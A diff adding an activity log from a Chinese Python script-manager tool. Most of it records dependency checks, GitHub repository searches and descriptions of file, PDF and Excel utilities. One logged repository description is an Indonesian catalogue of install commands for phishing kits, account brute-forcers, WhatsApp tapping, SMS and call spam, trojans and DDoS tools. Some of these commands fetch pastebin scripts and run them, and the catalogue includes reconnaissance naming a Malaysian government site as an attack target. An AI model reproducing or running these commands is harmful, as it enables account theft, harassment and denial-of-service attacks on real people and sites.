@@ -1,0 +1,2355 @@
+[2026-04-26 23:10:02] ─── 框架依赖检查 ───
+[2026-04-26 23:10:02] 扫描完成：添加 14 个脚本，更新 0 个脚本
+[2026-04-26 23:10:02] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-26 23:10:07] [内置Token] 最新版本: 1.7.1, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.7.1
+[2026-04-26 23:10:07] 当前已是最新版本 v1.7.1
+[2026-04-26 23:10:10] [脚本市场] 搜索：python script tool
+[2026-04-26 23:10:13] [脚本市场] 找到 8677 个仓库
+[2026-04-26 23:10:22] [脚本市场] 搜索：IDE
+[2026-04-26 23:10:25] [脚本市场] 找到 34596 个仓库
+[2026-04-26 23:10:27] [脚本市场] 选中仓库：oraios/serena - A powerful MCP toolkit for coding, providing semantic retrieval and editing capabilities  - the IDE for your agent
+[2026-04-26 23:10:30] [脚本市场] AI 分析完成：oraios/serena
+[2026-04-26 23:10:30] [脚本市场] README 为英文，自动翻译中...
+[2026-04-26 23:10:46] [脚本市场] 选中仓库：Dman95/SASM - SASM - simple crossplatform IDE for NASM, MASM, GAS and FASM assembly languages
+[2026-04-26 23:10:47] [脚本市场] README 已加载（中文）
+[2026-04-26 23:10:48] [脚本市场] AI 分析完成：Dman95/SASM
+[2026-04-26 23:10:56] [脚本市场] 选中仓库：thonny/thonny - Python IDE for beginners
+[2026-04-26 23:10:58] [脚本市场] AI 分析完成：thonny/thonny
+[2026-04-26 23:10:58] [脚本市场] README 为英文，自动翻译中...
+[2026-04-26 23:11:00] [脚本市场] README 翻译完成
+[2026-04-26 23:11:01] [脚本市场] README 翻译完成
+[2026-04-26 23:11:07] [脚本市场] 选中仓库：Cloud-CV/Fabrik - :factory: Collaboratively build, visualize, and design neural nets in browser
+[2026-04-26 23:11:09] [脚本市场] README 为英文，自动翻译中...
+[2026-04-26 23:11:09] [脚本市场] AI 分析完成：Cloud-CV/Fabrik
+[2026-04-26 23:11:24] 当前分组：测试工具
+[2026-04-26 23:11:25] 当前分组：测试项目
+[2026-04-26 23:11:28] 📄 测试项目/ThePhish/app/__init__.py
+[2026-04-26 23:11:28] （该脚本无头注释）
+[2026-04-26 23:11:28] 📄 测试项目/ThePhish/app/ws_logger.py
+[2026-04-26 23:11:28] ────────────────────────────────────────
+[2026-04-26 23:11:28] Class used for logging with different levels of severity
+The constructor takes the socketio object and the socket id of the client to send logs to
+[2026-04-26 23:11:28] 📄 测试项目/ThePhish/app/thephish_app.py
+[2026-04-26 23:11:28] （该脚本无头注释）
+[2026-04-26 23:11:28] 📄 测试项目/ThePhish/app/run_analysis.py
+[2026-04-26 23:11:28] （该脚本无头注释）
+[2026-04-26 23:11:28] 📄 测试项目/ThePhish/app/list_emails.py
+[2026-04-26 23:11:28] （该脚本无头注释）
+[2026-04-26 23:11:28] 📄 测试项目/ThePhish/app/case_from_email.py
+[2026-04-26 23:11:28] （该脚本无头注释）
+[2026-04-26 23:11:31] 📄 测试项目/ThePhish/app/case_from_email.py
+[2026-04-26 23:11:31] （该脚本无头注释）
+[2026-04-26 23:11:33] 📄 测试项目/ThePhish/app/case_from_email.py
+[2026-04-26 23:11:33] （该脚本无头注释）
+[2026-04-26 23:11:33] ─── 脚本「测试项目/ThePhish/app/case_from_email.py」依赖检查 ───
+[2026-04-26 23:11:33] 扫描到的所有导入：base64, email, emoji, hashlib, imaplib, io, ioc_finder, json, logging, re, thehive4py, traceback, urllib
+[2026-04-26 23:11:33] 第三方依赖：emoji, ioc_finder, thehive4py
+[2026-04-26 23:11:33] 
+[2026-04-26 23:11:33]   emoji: 未安装
+[2026-04-26 23:11:33]   ioc_finder: 未安装
+[2026-04-26 23:11:33]   thehive4py: 未安装
+[2026-04-26 23:11:33] 
+缺少直接依赖：emoji, thehive4py, ioc_finder
+[2026-04-26 23:11:33] 脚本「测试项目/ThePhish/app/case_from_email.py」缺少以下依赖： emoji, thehive4py, ioc_finder 是否立即安装？（将使用加速镜像源）
+[2026-04-26 23:11:36] [提示] 依赖未满足，取消运行：测试项目/ThePhish/app/case_from_email.py
+[2026-04-26 23:11:38] 📄 测试项目/ThePhish/app/__init__.py
+[2026-04-26 23:11:38] （该脚本无头注释）
+[2026-04-26 23:11:38] 📄 测试项目/ThePhish/app/ws_logger.py
+[2026-04-26 23:11:38] ────────────────────────────────────────
+[2026-04-26 23:11:38] Class used for logging with different levels of severity
+The constructor takes the socketio object and the socket id of the client to send logs to
+[2026-04-26 23:11:38] 📄 测试项目/ThePhish/app/thephish_app.py
+[2026-04-26 23:11:38] （该脚本无头注释）
+[2026-04-26 23:11:38] 📄 测试项目/ThePhish/app/run_analysis.py
+[2026-04-26 23:11:38] （该脚本无头注释）
+[2026-04-26 23:11:38] 📄 测试项目/ThePhish/app/list_emails.py
+[2026-04-26 23:11:38] （该脚本无头注释）
+[2026-04-26 23:11:38] 📄 测试项目/ThePhish/app/case_from_email.py
+[2026-04-26 23:11:38] （该脚本无头注释）
+[2026-04-26 23:11:41] 批量删除完成：6 个脚本
+[2026-04-26 23:11:43] 当前分组：系统工具
+[2026-04-26 23:11:46] 当前分组：测试工具
+[2026-04-26 23:11:49] 当前分组：默认分组
+[2026-04-26 23:11:50] 当前分组：测试项目
+[2026-04-26 23:11:53] 当前分组：默认分组
+[2026-04-26 23:11:53] 📄 文件夹内批量重命名.py
+[2026-04-26 23:11:53] ────────────────────────────────────────
+[2026-04-26 23:11:53] 文件夹内批量重命名 - 批量重命名指定文件夹内的文件。
+
+功能：
+- 添加前缀：在文件名前插入指定文字（如 "2024_" + "report.pdf" → "2024_report.pdf"）
+- 添加后缀：在文件名与扩展名之间插入指定文字（如 "report" + "_v2" + ".pdf" → "report_v2.pdf"）
+- 替换文字：将文件名中的指定文本替换为新文本
+- 按序号重命名：按顺序编号重命名，保留原扩展名（如 "photo_001.jpg", "photo_002.jpg"）
+
+安全机制：
+- 重命名前检查目标文件是否已存在，避免覆盖
+- 源文件不存在时自动跳过
+- 新名称与原名称相同时跳过
+- 操作前弹出确认对话框
+
+依赖：仅使用 Python 标准库（tkinter）
+[2026-04-26 23:11:54] 📄 PDF批处理工具.py
+[2026-04-26 23:11:54] ────────────────────────────────────────
+[2026-04-26 23:11:54] PDF 批处理工具 - 批量合并、拆分和转换 PDF 文件。
+
+功能：
+- 合并 PDF：将多个 PDF 文件合并为一个文件
+- 拆分 PDF：将一个 PDF 按页码范围拆分为多个文件
+- 提取页面：从 PDF 中提取指定页面
+- 添加水印：为 PDF 添加文字水印（支持自定义文字、颜色、透明度、角度）
+- 页面旋转：旋转 PDF 页面（90°/180°/270°）
+- 删除页面：删除 PDF 中的指定页面
+
+界面：
+- 左侧文件列表：支持拖拽添加文件，可调整顺序
+- 右侧操作面板：选择操作类型和参数
+- 底部输出目录：记忆上次输出目录
+- 进度条显示处理进度
+
+配置：
+- 输出目录记忆：保存到 config/pdf_tool.json
+- 水印参数记忆：上次使用的水印文字、颜色等
+
+依赖：PyPDF2（自动检测并提示安装）
+[2026-04-26 23:11:55] 当前分组：系统工具
+[2026-04-26 23:11:57] 当前分组：默认分组
+[2026-04-26 23:12:02] 📄 合并多个文件到一个excel.py
+[2026-04-26 23:12:02] ────────────────────────────────────────
+[2026-04-26 23:12:02] 合并多个文件到一个 Excel - 将多个 Excel/CSV 文件合并到一个工作簿的不同工作表中。
+
+功能：
+- 多文件合并：选择多个 Excel 文件，每个文件（或每个工作表）保存为独立的工作表
+- 智能命名：单工作表文件使用文件名作为工作表名，多工作表文件使用"文件名_原Sheet名"
+- 名称去重：工作表名重复时自动追加编号（如 "数据_1", "数据_2"）
+- 非法字符过滤：自动替换工作表名中的非法字符（\\ / ? * [ ] :）为下划线
+- 长度限制：工作表名超过 31 字符时自动截断
+- 自动列宽：根据标题和数据内容自动调整列宽（最小5，最大50）
+- 进度条：控制台显示文件处理进度
+- 完成提示音：合并完成后播放提示音（Windows）
+
+注意：
+- 使用 pandas 读取文件，支持 .xlsx / .xls / .csv 格式
+- 输出格式为 .xlsx
+- 不合并数据内容，每个源文件保留在独立的工作表中
+
+依赖：pandas, openpyxl
+[2026-04-26 23:12:03] 📄 合并多个文件的数据表到一页.py
+[2026-04-26 23:12:03] ────────────────────────────────────────
+[2026-04-26 23:12:03] 合并多个文件的数据表到一页 - 将多个 Excel 文件的数据表合并到同一个工作表中。
+
+功能：
+- 多文件汇总：选择多个 Excel 文件，提取指定工作表中指定行范围的数据
+- 工作表筛选：按关键词模糊匹配工作表名称（如输入"销售"匹配"2024年销售报表"）
+- 行范围指定：设置起始行和结束行，只提取该范围内的数据
+- 表头处理：可选包含原始表头或使用默认表头（来源文件、工作表名称、原始行号）
+- 双层进度条：文件级进度 + 工作表内行级进度，实时显示处理状态
+- 支持取消：处理过程中可随时点击取消按钮终止操作
+- 自动列宽：汇总结果自动调整列宽，中文宽度按双倍计算
+- 样式美化：表头行使用蓝色背景白色粗体字，数据行添加细边框
+
+输出格式：
+每行数据前附加三列：来源文件名、工作表名称、原始行号
+便于追溯数据来源
+
+依赖：openpyxl（自动检测并提示安装）
+[2026-04-26 23:12:04] 📄 批量新建文件夹.py
+[2026-04-26 23:12:04] ────────────────────────────────────────
+[2026-04-26 23:12:04] 批量新建文件夹 - 根据列表批量创建文件夹。
+
+功能：
+- 按序号创建：自动生成带编号的文件夹名（如 folder001, folder002...）
+可设置基础名称、起始编号、编号位数、创建数量
+- 添加前缀：为列表中的每个名称添加前缀（如 "项目_" + "A组" → "项目_A组"）
+- 添加后缀：为列表中的每个名称添加后缀（如 "A组" + "_备份" → "A组_备份"）
+- 自定义名称列表：每行输入一个文件夹名，直接创建
+
+安全机制：
+- 自动过滤文件名中的非法字符（<>:"/\\|?*），替换为下划线
+- 去除文件名首尾空格和结尾句点
+- 空名称自动替换为 "unnamed_folder"
+- 已存在的文件夹自动跳过，不会覆盖
+- 创建超过 10000 个文件夹时弹出警告确认
+- 操作前显示预览列表，标记已存在的文件夹
+
+依赖：仅使用 Python 标准库（tkinter）
+[2026-04-26 23:12:04] 📄 文件夹内批量重命名.py
+[2026-04-26 23:12:04] ────────────────────────────────────────
+[2026-04-26 23:12:04] 文件夹内批量重命名 - 批量重命名指定文件夹内的文件。
+
+功能：
+- 添加前缀：在文件名前插入指定文字（如 "2024_" + "report.pdf" → "2024_report.pdf"）
+- 添加后缀：在文件名与扩展名之间插入指定文字（如 "report" + "_v2" + ".pdf" → "report_v2.pdf"）
+- 替换文字：将文件名中的指定文本替换为新文本
+- 按序号重命名：按顺序编号重命名，保留原扩展名（如 "photo_001.jpg", "photo_002.jpg"）
+
+安全机制：
+- 重命名前检查目标文件是否已存在，避免覆盖
+- 源文件不存在时自动跳过
+- 新名称与原名称相同时跳过
+- 操作前弹出确认对话框
+
+依赖：仅使用 Python 标准库（tkinter）
+[2026-04-26 23:12:06] 📄 批量新建文件夹.py
+[2026-04-26 23:12:06] ────────────────────────────────────────
+[2026-04-26 23:12:06] 批量新建文件夹 - 根据列表批量创建文件夹。
+
+功能：
+- 按序号创建：自动生成带编号的文件夹名（如 folder001, folder002...）
+可设置基础名称、起始编号、编号位数、创建数量
+- 添加前缀：为列表中的每个名称添加前缀（如 "项目_" + "A组" → "项目_A组"）
+- 添加后缀：为列表中的每个名称添加后缀（如 "A组" + "_备份" → "A组_备份"）
+- 自定义名称列表：每行输入一个文件夹名，直接创建
+
+安全机制：
+- 自动过滤文件名中的非法字符（<>:"/\\|?*），替换为下划线
+- 去除文件名首尾空格和结尾句点
+- 空名称自动替换为 "unnamed_folder"
+- 已存在的文件夹自动跳过，不会覆盖
+- 创建超过 10000 个文件夹时弹出警告确认
+- 操作前显示预览列表，标记已存在的文件夹
+
+依赖：仅使用 Python 标准库（tkinter）
+[2026-04-26 23:12:07] 📄 合并多个文件的数据表到一页.py
+[2026-04-26 23:12:07] ────────────────────────────────────────
+[2026-04-26 23:12:07] 合并多个文件的数据表到一页 - 将多个 Excel 文件的数据表合并到同一个工作表中。
+
+功能：
+- 多文件汇总：选择多个 Excel 文件，提取指定工作表中指定行范围的数据
+- 工作表筛选：按关键词模糊匹配工作表名称（如输入"销售"匹配"2024年销售报表"）
+- 行范围指定：设置起始行和结束行，只提取该范围内的数据
+- 表头处理：可选包含原始表头或使用默认表头（来源文件、工作表名称、原始行号）
+- 双层进度条：文件级进度 + 工作表内行级进度，实时显示处理状态
+- 支持取消：处理过程中可随时点击取消按钮终止操作
+- 自动列宽：汇总结果自动调整列宽，中文宽度按双倍计算
+- 样式美化：表头行使用蓝色背景白色粗体字，数据行添加细边框
+
+输出格式：
+每行数据前附加三列：来源文件名、工作表名称、原始行号
+便于追溯数据来源
+
+依赖：openpyxl（自动检测并提示安装）
+[2026-04-26 23:12:08] 📄 合并多个文件到一个excel.py
+[2026-04-26 23:12:08] ────────────────────────────────────────
+[2026-04-26 23:12:08] 合并多个文件到一个 Excel - 将多个 Excel/CSV 文件合并到一个工作簿的不同工作表中。
+
+功能：
+- 多文件合并：选择多个 Excel 文件，每个文件（或每个工作表）保存为独立的工作表
+- 智能命名：单工作表文件使用文件名作为工作表名，多工作表文件使用"文件名_原Sheet名"
+- 名称去重：工作表名重复时自动追加编号（如 "数据_1", "数据_2"）
+- 非法字符过滤：自动替换工作表名中的非法字符（\\ / ? * [ ] :）为下划线
+- 长度限制：工作表名超过 31 字符时自动截断
+- 自动列宽：根据标题和数据内容自动调整列宽（最小5，最大50）
+- 进度条：控制台显示文件处理进度
+- 完成提示音：合并完成后播放提示音（Windows）
+
+注意：
+- 使用 pandas 读取文件，支持 .xlsx / .xls / .csv 格式
+- 输出格式为 .xlsx
+- 不合并数据内容，每个源文件保留在独立的工作表中
+
+依赖：pandas, openpyxl
+[2026-04-26 23:12:10] 📄 PDF批处理工具.py
+[2026-04-26 23:12:10] ────────────────────────────────────────
+[2026-04-26 23:12:10] PDF 批处理工具 - 批量合并、拆分和转换 PDF 文件。
+
+功能：
+- 合并 PDF：将多个 PDF 文件合并为一个文件
+- 拆分 PDF：将一个 PDF 按页码范围拆分为多个文件
+- 提取页面：从 PDF 中提取指定页面
+- 添加水印：为 PDF 添加文字水印（支持自定义文字、颜色、透明度、角度）
+- 页面旋转：旋转 PDF 页面（90°/180°/270°）
+- 删除页面：删除 PDF 中的指定页面
+
+界面：
+- 左侧文件列表：支持拖拽添加文件，可调整顺序
+- 右侧操作面板：选择操作类型和参数
+- 底部输出目录：记忆上次输出目录
+- 进度条显示处理进度
+
+配置：
+- 输出目录记忆：保存到 config/pdf_tool.json
+- 水印参数记忆：上次使用的水印文字、颜色等
+
+依赖：PyPDF2（自动检测并提示安装）
+[2026-04-26 23:16:28] ─── 框架依赖检查 ───
+[2026-04-26 23:16:28] 扫描完成：添加 8 个脚本，更新 0 个脚本
+[2026-04-26 23:16:28] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-26 23:16:32] 📄 PDF批处理工具.py
+[2026-04-26 23:16:32] ────────────────────────────────────────
+[2026-04-26 23:16:32] PDF 批处理工具 - 批量合并、拆分和转换 PDF 文件。
+
+功能：
+- 合并 PDF：将多个 PDF 文件合并为一个文件
+- 拆分 PDF：将一个 PDF 按页码范围拆分为多个文件
+- 提取页面：从 PDF 中提取指定页面
+- 添加水印：为 PDF 添加文字水印（支持自定义文字、颜色、透明度、角度）
+- 页面旋转：旋转 PDF 页面（90°/180°/270°）
+- 删除页面：删除 PDF 中的指定页面
+
+界面：
+- 左侧文件列表：支持拖拽添加文件，可调整顺序
+- 右侧操作面板：选择操作类型和参数
+- 底部输出目录：记忆上次输出目录
+- 进度条显示处理进度
+
+配置：
+- 输出目录记忆：保存到 config/pdf_tool.json
+- 水印参数记忆：上次使用的水印文字、颜色等
+
+依赖：PyPDF2（自动检测并提示安装）
+[2026-04-26 23:16:40] 重命名已取消
+[2026-04-26 23:21:27] ─── 框架依赖检查 ───
+[2026-04-26 23:21:27] 扫描完成：添加 8 个脚本，更新 0 个脚本
+[2026-04-26 23:21:27] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-26 23:40:43] ─── 框架依赖检查 ───
+[2026-04-26 23:40:43] 扫描完成：添加 8 个脚本，更新 0 个脚本
+[2026-04-26 23:40:43] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 09:28:26] ─── 框架依赖检查 ───
+[2026-04-27 09:28:26] 扫描完成：添加 8 个脚本，更新 0 个脚本
+[2026-04-27 09:28:26] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 09:39:24] ─── 框架依赖检查 ───
+[2026-04-27 09:39:24] 扫描完成：添加 8 个脚本，更新 0 个脚本
+[2026-04-27 09:39:24] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 09:39:27] [脚本市场] 搜索：python script tool
+[2026-04-27 09:39:29] [脚本市场] 找到 8683 个仓库
+[2026-04-27 09:39:30] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-27 09:39:31] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:39:34] [脚本市场] AI 分析完成：InstaPy/InstaPy
+[2026-04-27 09:39:37] [脚本市场] 选中仓库：ianzhao/textshot - Python tool for grabbing text via screenshot
+[2026-04-27 09:39:38] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:39:40] [脚本市场] API Key 已保存：本地服务 (127.0.0.1:8080)
+[2026-04-27 09:39:40] [脚本市场] README 翻译完成
+[2026-04-27 09:39:40] [脚本市场] README 翻译完成
+[2026-04-27 09:39:42] [脚本市场] 选中仓库：landy22granatt/Kumpulan-Script-Termux - Ok, Langsung Saja Ke Materi. Sesuai Judul, Disini Saya Akan Memberikan Kumpulan Script Termux Yang Masih Work. Karena, Jarang Sekali Saat Ini Mendapatkan Script Yang Benar-Benar Work.  ✓BOT KOMEN DAN LIKE INSTAGRAM $ pkg update $ pkg upgrade $ pkg install python2 $ pkg install ruby $ gem install lolcat $ pkg install git $git clonehttps://github.com/Hanzelnutt/instabot $ cd instabot $ ls $ pip2 install -r requirements.txt $ bash instabot  ✓PHISING AKUN GMAIL $apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher  2. EXPLOIT  ✓SADAP WHATSAPP $ pkg install git python2 $ git clone https://github.com/Bl4ckDr460n/HxWhatsApp $ cd HxWhatsapp $chmod +x HxWhatsApp $ python2 HxWhatsApp.py  ✓CONNECT WIFI TANPA PASWORD $apt update && apt upgrade $pkg install git $git clone https://github.com/esc0rtd3w/wifi-hacker $cd wifi-hacker/ $chmod +x wifi-hacker.sh $./wifi-hacker.sh  ✓MELACAK LOKASI Script ini menggunakan alamat IP untuk melacak koordinat target. $apt update $apt upgrade $pkg install python git $git clonehttps://github.com/maldevel/IPGeoLocation $cd IPGeoLocation $chmod +x ipgeolocation.py $pip install -r repuirements.txt $python ipgeolocation.py -m $python ipgeolocation.py -h $python ipgeolocation.py -t 10.99.110.220  Ubah alamat IP yang berwarna kuning dengan alamat IP dari orang yang ingin dilacak. Kemudian copas semua koordinat mulai dari https:// ke browser kalian. *✓DEFACE'  Deface merupakan kata dari bahasa ingris yang artinya merusak, mengotori, mencoreng, dan menghapus. Namun dalam dunia hacker deface adalah kegiatan hacking dengan merubah tampilan suatu website. Baik halaman utama maupun halaman yang terkait dalam suatu url. $apt update && apt upgrade $apt install python2 openssl curl libcurl $pip2 install urllib3 chardet certifi idna requests $mkdir webdav $cd webdav $wget https://pastebin.com/raw/HnVyQPtR $mv HnVyQPtR webdav.py $chmod +x webdav.py  ✓SPAM SMS $pkg install php curl $pkg install curl $curl https://pastebin.com/raw/9BYy1JVc -o jdid.php $php jdid.php  ✓SPAM CALL (TOKOPEDIA) $apt update && apt upgrade $pkg install php $pkg install git $git clone https://github.com/storiku/Call $cd Call $php spamcall.php  Lalu masukan no hp korban  ✓SC TROJAN (TARGET) $pkg update & pkg upgrade $pkg install git $git clone https://github.com/4L13199/meTAInstall $cd meTAInstall $chmod +x meTAInstall $sh meTAInstall.sh 3.TOOL INSTALLER Tools installer adalah tools yang digunakan untuk menginstal banyak script. Biasanya tools installer dapat menginstal 200-300 script.  ✓TOOLS SCORPION $git clone https://github.com/ScorpRx/ScorpRx-Tools $cd ScorpRx-Tools $chmod +x ScorpRx-Tools.sh $sh ScorpRx-Tools.sh  ✓TOOLS NETHUNTER $apt update $apt install git $git clone https://github.com/Hax4us/Nethunter-In-Termux.git $cd Nethunter $chmod +x kalinethunter $./kalinethunter $./startkali.sh  ✓TOOLS LAZYMUX $pkg update && upgrade $pkg install python2 git $git clone https://github.com/Gameye98/Lazymux $cd Lazymux $chmod +x lazymux.py $python2 lazymux.py  ✓TOOLS DAIJOBU $apt upgrade && apt update $apt install php git $git clone https://github.com/alintamvanz/diejoubu $cd diejoubu $cd v1.2 $php diejoubu.php  ✓TOOLS B4J1N94N $git clonehttps://github.com/DarknessCyberTeam/B4J1N64Nv5 $cd B4J1N64Nv5 $sh B4J1N64N.sh  *4. DDOS DDOS attack adalah singkatan dari distributed denial of services yang berfungsi untuk membuat suatu server komputer menjadi tidak bisa dipakai oleh user-nya, dengan menggunakan ribuan system yang menyerang secara bersamaan.  ✓HAMMER $pkg update && pkg upgrade $pkg install python git $git clone https://github.com/cyweb/hammer $cd hammer $python hammer.py $python hammer.py -s [IP target] -p [PORT] -t 135  ✓LUCINTA DDOS $ apt update && napt upgrade $ apt install python $ apt install git $ git clone https://github.com/zlucifer/lucita_ddos $ cd lucita_ddos $ chmod +x pukul.py $ python pukul.py  ✓DDOS TROJAN $ pkg update && pkg upgrade $ pkg install python $ pkg install bash $ pkg install toilet $ pkg install lolcat $ pkg install git $ git clone https://github.com/MrTamfanX/MrDdos $ cd MrDdos $ sh Tamfan-Ddos.sh  ✓Win 32DDOS ATTACK $ apt upgrade&&apt update $ apt install git toilet $ apt install python $ apt install python2 $ git clone https://github.com/banghyuu/ddosWD ‌$ cd ddosWD $ sh Ddos.sh  √XERXES ‌$ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80  √TORSHAMMER $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls $ cd torshammer $ chmod +x torshammer.oy $ python2 torshammer.py  ✓VANESSA ANGGEL DDOS $ pkg update && pkg upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/MiSetya/VA-DDOS $ cd VA-DDOS $ ls $ chmod +x 80juta.py $ ls $ python2 80juta.py  ✓DDOS BY.BLACKCYC $pkg install git $git clone https://github.com/BlackCyberAnonim/B-ATTACKING $cd B-ATTACKING $ls $sh install.Sh  Virtex for Whatsapp  apt update && apt upgrade  apt install git  apt install curl  apt install figlet  apt install ruby  gem install lolcat  git clone https://github.com/muhammadfathul/VIRTEX  cd VIRTEX  chmod +x virtex.sh  sh virtex.sh  ⚔TOOLS HACK VIA TERMUX⚔  🔰TOOLS HACK FB TEMAN🔰 Versi Terbaru Cracknya Lbh Cepat  $ apt update && apt upgrade $ pip2 install --upgrade pip $ pip2 install requests $ pip2 install mechanize $ pkg install git $ git clone https://github.com/blackcodercrush/hack-facebook-teman $ cd hack-facebook-teman $ sh requests.sh $ python2 hack-fb.py _______________  🔰Hack Facebook target 🔰  $ apt update && apt upgrade $ apt install git $ apt install python2 $ pip2 install mechanize $ git clone https://github.com/FR13ND8/BRUTEFORCEnew $ cd BRUTEFORCEnew $ sh new.sh _______________ 🔰Hack ig🔰  $ pkg install nano $ pkg install figlet  $ pkg install python2 $ pip2 install lolcat  $ pkg install cowsay $ pkg install git $ git clone https://github.com/darkcurut08/darkcurut08 $ cd darkcurut08 $ sh Moreno77.sh _______________  🔰Hack Facebook Terbaru🔰  $ apt update && apt upgrade $ pkg ins toilet $ pkg ins figlet $ pkg ins ruby $ pkg ins gem $ gem ins lolcat $ pkg ins php $ pkg ins python2 $ pkg ins git $ git clone https://github.com/Rusmana-ID/rus, $ cd rus $ sh v2.sh  rename: Anak pw: Bangsa _______________ 🔰TOOLS SADAP🔰  $ apt update && apt upgrade $ apt install php git $ apt install bash $ git clone https://github.com/MrTamfanX/TamfanFacebook $ cd TamfanFacebook $ chmod +x * $ chmod -R 775 lib $ sh install.sh $ sh tamfan.sh _______________ 🔰DDos Attack WI-FI🔰  $ apt update && apt upgrade $ apt install python2 $ apt install git $ $ cd LITEDDOS  Cek:https://ipsaya.com/hostinglokasi.php  $ python2 LITEDDOS.py [IP target] 80 100 _______________ 🔰DDos Attack HP Orang 🔰  $ apt update && apt upgrade $ pkg install python2 $ pip2 install mechanize $ pip2 install request $ pkg install git $ git clone https://github.com/R133F/Trojans $ cd Trojans $ python2 trojans.py   DDOS WiFi nya masih work  Hack Fb Target New  ------------------------------------------  pkg install git pkg install python2 pip2 install --upgrade pip pip2 install mechanize git clone https://github.com/MRA27/FBNEWV2 cd FBNEWV2 python2 MRA27.py 100003191711187   apt update && apt upgrade apt install php apt install python2 apt install toilet apt install git git clone https://github.com/4L13199/LITESPAM cd LITESPAM sh LITESPAM.sh  Oke langsung saja ke penginstalannya..  $ apt update && apt upgrade $ apt install git $ apt install php $ apt install figlet $ apt install toilet $ apt install python2 $ pip2 install requests $ pip2 install termcolor $ git clone https://github.com/DarknessCyberTeam/BAJINGANv6.git $ cd BAJINGANv6 $ sh BAJINGAN.sh Masukkan Username Ini username : BAJINGAN Masukkan Password Ini password :  Gans Kumpulan Tools By InYourG00D Izin promosi biar laku ea  Nuub Numpang Lewat  Silahkan Cek https://github.com/InYourG00D1 Disitu Ada Tools Bermanfaat :V Work gk? lu cobain aja   ÷Kumpulan Kode Unik fb÷ $ pkg install update && pkg install upgrade $ apt install toilet $ apt install figlet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Unix $ cd Unix $ sh KD-FB.sh  ÷Tools Check BIN÷ $ pkg install update & pkg install upgrade $ pkg install git $ git clone https://github.com/InYourG00D1/check $ cd check $ php bin.php  ÷Tools Spam bom÷ Vitur  1.Spam bom Bukalapak 2.Spam bom JD-ID 3.Spam Bom PHD 4.Spam Bom Tokoped 5.Spam Bom Hooq 6.Spam Bom KFC 7.Spam bom matahari _Totur nya _ $ pkg install update && pkg install upgrade $ pkg install toilet $ pkg install figlet $ pkg install lolcat $ pkg install php $ pkg install python2 $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Spam $ cd Spam $ sh ms.sh  ÷Kuota free Khusus Tree÷ $ pkg install update && pkg install upgrade $ apt install toilet $ apt install figlet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/KuotaFree $ cd KuotaFree $ sh 2.sh  ÷Pulsa Free work100%÷ $ pkg update&&pkg upgrade $ pkg install toilet $ gem install lolcat $ git clone https://github.com/InYourG00D1/PulsaFree $ ls $ cd PulsaFree $ sh Free.sh  ÷Tools Sc Phising All Game÷ Tapi gk semua game juga si :V $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/ScPh1s1ng $ cd ScPh1s1ng $ sh 6.sh  ÷Kumpulan shell & sc pepes÷ Kalo Ingin Direcode scnya silahkan Hak cipta Jangan Dirubah Hargai mereka coding gan Ngecoding Gk Segampang Dapettin Cinta Kamu $ pkg install update && pkg install upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Pepescers $ cd Pepescers $ sh MTD.sh  ÷Tools ngubah Vidmax jadi Flash÷ Work 100% dicoba aja gan $ pkg install update $ pkg install upgrade $ apt install php $ pkg install git $ git clone https://github.com/InYourG00D1/Flash $ cd Flash $ php flash.php  ÷Tools Nuyul GoPay÷ $ pkg install update $ pkg install upgrade $ apt install php $ pkg install git $ git clone https://github.com/InYourG00D1/Nuyul-GoPay $ cd Nuyul-GoPay $ php Go-Pay.php  ÷Tools Install Bkp÷ Yg punya Kontol BuKan Lu doang Bwahaha Proses Install nya lumayan lama :V Kalo Mau Cepet Cari Ea Sono  $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/TumbalGanss/ToolsBkp $ cd ToolsBkp $ sh Tobat.sh  ÷Tools Installer÷ 200 tools  $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/InstallPlerN2 $ cd InstallPlerN2 $ sh InstallPlerV2.sh  ÷Tools Script Phising All÷ game,FB,Instagram $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/scPH1S1N9 $ cd scPH1S1N9 $ sh PhisingV2.sh  #shareMhank #nomor Yg ada Di Tools Udh Gk Aktif #Ini New Nomer nya : 0895805133060  https://chat.whatsapp.com/Cj0VpOmWpQBJUEQZqqOLn3  [+] Site Title: MyGOV - The Government of Malaysia's Official Portal [+] IP address: 150.242.182.57 [+] Web Server: Apache [+] CMS: Could Not Detect [+] Cloudflare: Not Detected [+] Robots File: Could NOT Find robots.txt!  TARGET IP=150.242.182.57  PORT:80   TARGET WEB=malaysia.gov.my   HARI INI 16-APRIL-2019 JAM 15.00 WIB   TOOL ATTACK?  -=NEW TOOL=- ================= Win32 attack ================= apt install git apt install python apt install bash apt install toilet apt install lolcat git clone https://github.com/BPCATTACKER/DOS-TOOKITS cd DOS-TOOKITS sh DoS-TOOKIT.sh  APA YG BARU? -PERBAIKAN ERROR SAAT MENGIRIM PACKET ATTACK -DLL  ================ DDOS 